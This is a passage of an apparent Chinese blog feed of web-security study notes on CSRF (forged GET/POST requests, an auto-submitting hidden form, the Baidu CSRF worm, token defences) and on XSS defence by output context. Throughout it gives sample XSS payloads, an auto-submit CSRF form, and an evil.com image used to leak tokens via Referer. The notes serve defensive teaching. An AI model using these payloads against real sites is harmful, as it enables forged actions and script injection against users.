等带“src”属性的标签，这类标签只能够发起一次GET请求，而不能发起POST请求。</p><p>但是，这并不表示只要把重要的操作改成只允许POST请求，就能防止CSRF攻击。</p><ul><li><p><strong>情景1：服务器没有区分get和post请求</strong></p><ul><li><p>对于很多网站的应用来说，一些重要操作并未严格地区分GET与POST，攻击者可以使用GET来请求表单的提交地址。比如在PHP中，如果使用的是<code>$_REQUEST</code>，而非<code>$_POST</code>变量，则会存在这个问题。</p></li><li><p>例子：</p><p>以下表单</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/register&quot; id=&quot;register&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=text name=&quot;username&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=password name=&quot;password&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=submit name=&quot;submit&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>用户可以尝试构造一个GET请求</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/register?username=test&amp;password=passwd</span><br></pre></td></tr></table></figure><p><u>如果服务器没有区分get和post请求，那么这个请求会通过。</u></p></li></ul></li><li><p><strong>情景2：服务器区分get和post请求，可以在攻击代码中构造Post</strong></p><ul><li><p>服务器区分get和post请求的情况下，仍然可以在一个页面中构造好一个form表单，然后使用JavaScript自动提交这个表单。</p></li><li><p>例子：</p><p><code>http://www.b.com/test.html</code> 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://www.a.com/register&quot; id=&quot;register&quot; method=&quot;post&quot; &gt;</span><br><span class="line">&lt;input type=text name=&quot;username&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=password name=&quot;password&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=submit name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var f = document.getElementById(&quot;register&quot;);</span><br><span class="line">f.inputs[0].value = &quot;test&quot;;</span><br><span class="line">f.inputs[1].value = &quot;passwd&quot;;</span><br><span class="line">f.submit();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以<strong>将这个页面隐藏在一个不可见的iframe窗口中</strong>，那么整个自动提交表单的过程，对于用户来说也是不可见的。可以成功实现攻击（前提是获取到了cookie）</p></li></ul></li></ul><h2 id="csrf-worm"><a class="markdownIt-Anchor" href="#csrf-worm"></a> CSRF worm</h2><p>2008年9月，国内的安全组织80sec公布了一个百度的CSRF Worm。 漏洞出现在百度用户中心的发送短消息功能中：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://msg.baidu.com/?ct=22&amp;cm=MailSend&amp;tn=bmSubmit&amp;sn=用户账户&amp;co=消息内容</span><br></pre></td></tr></table></figure><p>只需要修改参数sn，即可对指定的用户发送短消息。</p><p>百度的另外一个接口则能查询出某个用户的所有好友：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://frd.baidu.com/?ct=28&amp;un=用户账户&amp;cm=FriList&amp;tn=bmABCFriList&amp;callback=gotfriends</span><br></pre></td></tr></table></figure><p>将两者结合起来，可以组成一个CSRF Worm——让一个百度用户查看恶意页面后，将给他的所有好友发送一条短消息，然后这条短消息中又包含一张图片，其地址再次指向CSRF页面，使得这些好友再次将消息发给他们的好友，这个Worm因此得以传播。</p><h1 id="csrf防御"><a class="markdownIt-Anchor" href="#csrf防御"></a> CSRF防御</h1><h2 id="验证码"><a class="markdownIt-Anchor" href="#验证码"></a> 验证码</h2><ol><li><p><strong>概念</strong></p><p>验证码被认为是对抗CSRF攻击<strong>最简洁而有效的防御方法</strong>。</p><p>CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。</p></li><li><p><strong>缺点</strong></p><ul><li>但是很多时候，出于用户体验考虑，网站不能给所有的操作都加上验证码。</li></ul><p>因此，验证码只能作为防御CSRF的一种辅助手段，而不能作为最主要的解决方案。</p></li></ol><h2 id="referer-check"><a class="markdownIt-Anchor" href="#referer-check"></a> Referer Check</h2><ol><li><p><strong>概念</strong></p><p>常见的互联网应用，页面与页面之间都具有一定的逻辑关系，这就使得每个正常请求的Referer具有一定的规律。</p><p>例，一个“论坛发帖”的操作，在正常情况下需要先登录到用户后台，或者访问有发帖功能的页面。在提交“发帖”的表单时，Referer的值必然是发帖表单所在的页面。如果Referer的值不是这个页面，甚至不是发帖网站的域，则极有可能是CSRF攻击。</p></li><li><p><strong>缺点</strong></p><ul><li>服务器并非什么时候都能取到Referer。</li><li>很多用户出于隐私保护的考虑，限制了Referer的发送。</li><li>在某些情况下，浏览器也不会发送Referer。例如：从HTTPS跳转到HTTP，出于安全的考虑，浏览器也不会发送Referer。</li></ul><p>无法依赖于Referer Check作为防御CSRF的主要手段，可以通过Referer Check来监控CSRF攻击的发生。</p></li></ol><h2 id="anti-csrf-token"><a class="markdownIt-Anchor" href="#anti-csrf-token"></a> Anti CSRF Token</h2><p>目前<strong>业界针对CSRF的防御</strong>，一致的做法是使用Token</p><ol><li><p><strong>为什么使用Token</strong></p><p>CSRF能够攻击成功，其本质原因是重要操作的所有参数都是可以被攻击者猜测到的。</p><p>出于这个原因，可以想到一个解决方案：<strong>把参数加密，或者使用一些随机数</strong>，从而让攻击者无法猜测到参数值，这就是token</p></li><li><p><strong>具体方法</strong></p><p>URL中，保持原参数不变，新增一个参数Token，值随机且不可预测：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/path/delete?username=abc&amp;item=123&amp;token=[random(seed)]</span><br></pre></td></tr></table></figure><p>Token需要足够随机，必须使用足够安全的随机数生成算法，或者采用真随机数生成器，且为用户与服务器所共同持有，不能被第三者知晓。在实际应用时，Token可以放在用户的Session中，或者浏览器的Cookie中。</p><p>由于Token的存在，黑客无法再构造出一个完整的URL实施CSRF攻击。</p><p>在提交请求时，服务器只需验证表单中的Token，与用户Session（或Cookie）中的Token是否一致，如果一致，则认为是合法请求；如果不一致，或者有一个为空，则认为请求不合法，可能发生了CSRF攻击。</p></li><li><p><strong>Token的使用原则</strong></p><ul><li><p>Token的生成一定要足够随机</p></li><li><p>设置一个用户的有效生命周期，在Token消耗掉前都使用同一个Token。</p><blockquote><p>如果用户已经提交了表单，则这个Token已经消耗掉，应该再次重新生成一个新的Token。</p><p>如果Token保存在Cookie中，而不是服务器端的Session中，一个用户打开几个相同的页面同时操作，当某个页面消耗掉Token后，其他页面的表单内保存的还是被消耗掉的那个Token，因此其他页面的表单再次提交时，会出现Token错误。在这种情况下，可以考虑<strong>生成多个有效的Token，以解决多页面共存的场景</strong>。</p></blockquote></li><li><p>保密性</p><ul><li><p><strong>Token如果出现在某个页面的URL中，则可能会通过Referer的方式泄露。</strong></p><p>在使用Token时，应该尽量把Token放在表单中。把敏感操作由GET改为POST，以form表单（或者AJAX）的形式提交。</p><p>例子：</p><p>以下是一个页面中删除操作的URL</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/path/manage?username=abc&amp;token=[random] </span><br></pre></td></tr></table></figure><p>如果这个页面包含了一张攻击者能指定地址的图片：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://evil.com/notexist&quot; /&gt;</span><br></pre></td></tr></table></figure><p>那么，当浏览器尝试加载这张图片时，会向 <code>http://evil.com</code> 服务器发送一个请求。在这个请求的HTTP头中，会包含Referer字段，其值为上面代表删除操作的URL。</p><p>攻击者通过查看Referer字段的内容，即可获取到包含敏感Token的URL，从而导致Token泄露。</p><blockquote><p>url中不是已经泄露了token嘛，为什么还要靠referer字段来获取token?</p><p>因为url中的token只有用户自己能看到，而后面的图片加载将url写入referer，让攻击者可以接收到对应操作中的token</p></blockquote></li><li><p>还有其他的可能导致token泄露的方法，如XSS、跨域漏洞等</p><blockquote><p>CSRF的Token仅仅用于对抗CSRF攻击，当网站还同时存在XSS漏洞时，这个方案就会变得无效，因为XSS可以模拟客户端浏览器执行任意操作。</p><p>在XSS攻击下，攻击者完全可以请求页面后，读出页面内容里的Token值，然后再构造出一个合法的请求。 这个过程可以称之为XSRF，和CSRF以示区分。</p></blockquote></li></ul></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 客户端脚本安全 </tag>
            
            <tag> CSRF攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『跨站脚本攻击』CSRF攻击</title>
      <link href="/posts/ceb6.html"/>
      <url>/posts/ceb6.html</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍如何对XSS攻击进行防御</p><h1 id="httponly"><a class="markdownIt-Anchor" href="#httponly"></a> HttpOnly</h1><ol><li><p>定义：浏览器禁止页面的JS访问带有HttpOnly属性的Cookie。</p><blockquote><p>HttpOnly并非防止出现XSS，而是防御XSS后的Cookie劫持攻击。</p></blockquote></li><li><p>作用方式</p><p>在服务器对浏览器的请求进行回复，Set-Cookie时对cookie进行标记，服务器可能会设置多个Cookie，而HttpOnly可以有选择性地加在任何一个Cookie值上，因此可以仅将其加在用于认证的关键cookie上面。</p></li></ol><h1 id="输入检查"><a class="markdownIt-Anchor" href="#输入检查"></a> 输入检查</h1><ol><li><p>定义：</p><p>目前Web开发的普遍做法，是同时在<strong>客户端JavaScript</strong>中和<strong>服务器端代码</strong>中实现相同的输入检查。</p><blockquote><p>原因：</p><ul><li><strong>客户端检查提高用户体验</strong>：在客户端进行输入验证可以即时反馈错误信息给用户，无需等待服务器响应。节约了服务器资源的同时，也可以快速指导用户纠正错误，提高整体的用户体验。</li><li><strong>服务端检查保障安全性</strong>：尽管客户端验证可以提供即时反馈，但它<strong>可以被绕过</strong>。用户可以修改客户端代码，或者直接通过HTTP请求工具发送请求绕开客户端。因此，<strong>服务端验证是必不可少</strong>的，它保证了即使客户端验证被绕过，服务端仍然能够保护应用免受恶意数据的影响。</li></ul></blockquote></li><li><p>作用方式：存在比较多的开源xssfilter</p></li><li><p>局限性</p><p>1）<strong>语境</strong></p><p>XSS Filter在用户提交数据时获取变量，并进行XSS检查；但此时用户数据并没有结合渲染页面的HTML代码，因此XSS Filter对语境的理解并不完整。</p><blockquote><p>例如：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;$var&quot; &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其中<code>$var</code>是用户可以控制的变量。用户只需要提交一个恶意脚本所在的URL地址，即可实施XSS攻击。</p><p>如果是一个全局性的XSS Filter，则无法看到用户数据的输出语境，而只能看到用户提交了一个URL，很可能会漏报。因为在大多数情况下，URL是一种合法的用户数据。</p></blockquote><p>2）<strong>字符处理</strong></p><p>如果仅仅是对 <code>&lt;</code>、<code>&quot;</code> 等字符进行粗暴的转义或替换处理，可能会改变用户数据的语义。</p></li></ol><h1 id="输出检查"><a class="markdownIt-Anchor" href="#输出检查"></a> 输出检查</h1><h2 id="安全的编码函数"><a class="markdownIt-Anchor" href="#安全的编码函数"></a> 安全的编码函数</h2><ol><li><p><strong>可以使用编码函数对输出中的敏感符号进行转义</strong></p><p>例如：JavascriptEncode对除数字、字母以外的所有字符，使用十六进制的方式进行编码。</p><p>还有很多的编码函数，如XMLEncode、JSONEncode等。</p></li><li><p><strong>在转义的时候要关注上下文环境</strong></p><p>不同的上下文环境（HTML文档结构和JavaScript程序逻辑）对数据的解析方式不同。如果在不适当的上下文中使用错误的转义方法，可能不会产生预期的防护效果，仍然允许XSS攻击的发生。所以要<strong>在正确的地方使用正确的编码方式</strong>。</p><p>例如：</p><p>a. <strong>初始HTML代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">htmlCopy code&lt;body&gt;</span><br><span class="line">&lt;a href=# onclick=&quot;alert(&#x27;$var&#x27;);&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>这里的意图是在用户点击链接时弹出变量<code>$var</code>的内容。</p><p>b. <strong>用户输入和攻击向量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript</span><br><span class="line">Copy code</span><br><span class="line">$var = htmlencode(&quot;&#x27;);alert(&#x27;2&quot;);</span><br></pre></td></tr></table></figure><p>用户通过输入特制的字符串试图结束原有的<code>alert</code>函数调用，并开始一个新的<code>alert</code>函数，实际上注入了额外的JavaScript代码。</p><p>c. <strong>HTML编码应用后的结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">htmlCopy code&lt;body&gt;</span><br><span class="line">&lt;a href=# onclick=&quot;alert(&#x27;&amp;#x27;&amp;#x29;&amp;#x3b;alert&amp;#x28;&amp;#x27;2&#x27;);&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>这里，虽然特殊字符被HTML编码，看似安全，但问题在于浏览器的解析顺序。</p><p><strong>浏览器解析流程</strong>:</p><ul><li>**HTML解析器（HTMLParser）**优先运行，它会解码HTML实体，从而恢复JavaScript代码中的特殊字符。</li><li>**JavaScript解析器（JavaScript Parser）**随后执行，此时JavaScript代码已经被“修复”成可以执行的形式。</li></ul><p>因此，最终执行的JavaScript为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript</span><br><span class="line">Copy code</span><br><span class="line">alert(&#x27;&#x27;);alert(&#x27;2&#x27;);</span><br></pre></td></tr></table></figure><p>这实现了攻击者的目的：在页面中注入了额外的JavaScript代码。</p></li></ol><h1 id="各种场景下的xss防御"><a class="markdownIt-Anchor" href="#各种场景下的xss防御"></a> 各种场景下的XSS防御</h1><p>想要根治XSS问题，可以列出所有XSS可能发生的场景，再一一解决。</p><p>下面用变量“$var”表示用户数据，它将被填充入HTML代码中。</p><p>可能存在以下场景：</p><h2 id="在html标签中输出"><a class="markdownIt-Anchor" href="#在html标签中输出"></a> 在HTML标签中输出</h2><ul><li><p><strong>例子</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span>$var<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用方式</strong></p><p>一般是构造一个<code>&lt;script&gt;</code>标签，或者是任何能够产生脚本执行的方式。比如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><p>对变量使用HtmlEncode。</p></li></ul><h2 id="在html属性中输出"><a class="markdownIt-Anchor" href="#在html属性中输出"></a> 在HTML属性中输出</h2><ul><li><p><strong>例子</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;$var&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用方式</strong></p><p>使用 <code>&quot;</code> 闭合属性引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;&quot; &gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><p>HtmlEncode。</p></li></ul><h2 id="在script标签中输出"><a class="markdownIt-Anchor" href="#在script标签中输出"></a> 在script标签中输出</h2><ul><li><p><strong>例子</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = <span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用方式</strong></p><p>使用 <code>&quot;</code> 闭合引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = <span class="string">&quot;&quot;</span>;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>);<span class="comment">//&quot;;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><p>JavascriptEncode</p></li></ul><h2 id="在事件中输出"><a class="markdownIt-Anchor" href="#在事件中输出"></a> 在事件中输出</h2><ul><li><p><strong>例子</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;$var&#x27;)&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用方式</strong></p><p>闭合引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;&#x27;);alert(/xss/);//&#x27;)&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><p>JavascriptEncode</p></li></ul><h2 id="在css中输出"><a class="markdownIt-Anchor" href="#在css中输出"></a> 在CSS中输出</h2><ul><li><p><strong>例子与利用方式</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 通过@import指令从恶意URL导入一个CSS文件</span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@import&#x27;http://ha.ckers.org/xss.css&#x27;;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"># 从指定的URL加载绑定文件，该文件可以包含恶意的XBL</span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="language-css"><span class="selector-tag">BODY</span>&#123;-moz-binding:<span class="built_in">url</span>(<span class="string">&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;</span>)&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"># behavior属性用于将特定的行为（通常是HTC文件，一种微软专有的HTML组件）附加到页面元素。</span><br><span class="line"><span class="tag">&lt;<span class="name">XSS</span> <span class="attr">STYLE</span>=<span class="string">&quot;behavior: url(xss.htc);&quot;</span>&gt;</span></span><br><span class="line"># 利用CSS中的list-style-image属性，插入JavaScript代码，该代码在渲染列表项图像时执行。</span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="language-css"><span class="selector-tag">li</span> &#123;<span class="attribute">list-style-image</span>: <span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>);&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">UL</span>&gt;</span><span class="tag">&lt;<span class="name">LI</span>&gt;</span>XSS</span><br><span class="line"># 通过background-image属性插入JavaScript代码。</span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span></span><br><span class="line"># expression是一个允许CSS属性值为JavaScript表达式的特性。这可以用来执行JavaScript代码。</span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><p>尽可能地禁止用户控制的变量在<code>&lt;style&gt;</code>标签、HTML标签的style属性以及CSS文件中输出。</p><p>可以使用encodeForCSS()函数</p></li></ul><h2 id="在地址中输出"><a class="markdownIt-Anchor" href="#在地址中输出"></a> 在地址中输出</h2><ul><li><p><strong>例子</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.evil.com/?test=$var&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用方式</strong></p><p>一个url的组成一般如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Protocal][Host][Path][Search][Hash]</span><br></pre></td></tr></table></figure><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.a.com/a/b/c/test?abc=123#sss</span><br><span class="line">[Protocal]=&quot;https://&quot;</span><br><span class="line">[Host]=&quot;www.a.com&quot;</span><br><span class="line">[Path]=&quot;/a/b/c/test&quot;</span><br><span class="line">[Search]=&quot;?abc=123&quot;</span><br><span class="line">[Hash]=&quot;#ssss&quot;</span><br></pre></td></tr></table></figure><p>攻击者可能会构造伪协议实施攻击，包括javascript、vbscript、dataURI等</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1);&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>闭合引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;&#x27;);alert(/xss/);//&#x27;)&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><ul><li><p><strong>检查URL的协议</strong>：确保URL以“http”或“https”开头，如果不是，则自动添加。</p></li><li><p><strong>URLEncode路径和参数</strong>：在确保协议和主机部分正确后，再对路径和参数部分进行URLEncode。</p><blockquote><p>在用户能够完全控制URL的情况下，Protocal和Host部分不能使用URLEncode，否则会改变URL的语义。</p></blockquote></li></ul></li></ul><h1 id="富文本处理"><a class="markdownIt-Anchor" href="#富文本处理"></a> 富文本处理</h1><p>什么是富文本：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有些时候，网站需要允许用户提交一些自定义的HTML代码，称之为“富文本”。</span><br><span class="line">比如一个用户在论坛里发帖，帖子的内容里要有图片、视频，表格等，</span><br><span class="line">这些“富文本”的效果都需要通过HTML代码来实现。</span><br></pre></td></tr></table></figure><p>如何处理富文本：</p><ul><li>通过htmlparser可以解析出HTML代码的标签、标签属性和事件。</li><li>禁止事件</li><li>标签的选择：使用白名单，只允许<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;div&gt;</code>等比较“安全”的标签存在。</li><li>自定义CSS：尽量禁止</li></ul><h1 id="dom-based-xss-防御"><a class="markdownIt-Anchor" href="#dom-based-xss-防御"></a> DOM Based XSS 防御</h1><p>前文提到的方法都是针对 “<strong>从服务器应用直接输出到HTML页面</strong>” 的XSS漏洞，并不适用于DOM Based XSS。</p><blockquote><p>DOM Based XSS漏洞发生在客户端，<strong>浏览器</strong>在解析和执行JavaScript代码时引入了恶意脚本。</p></blockquote><ul><li><p><strong>例子1</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//将 div 元素 (id=&quot;t&quot;) 的内部 HTML 设置为一个带有 str 作为链接地址的 &lt;a&gt; 元素。链接的文本显示为 testLink。</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;t&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27; &gt;testLink&lt;/a&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;t&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;s&quot;</span> <span class="attr">value</span>=<span class="string">&quot;write&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;test()&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>在button的onclick事件中，执行了test()函数，而该函数将text标签的输入值写入了DOM节点，最后导致了XSS的发生。</p></li><li><p><strong>例子2</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 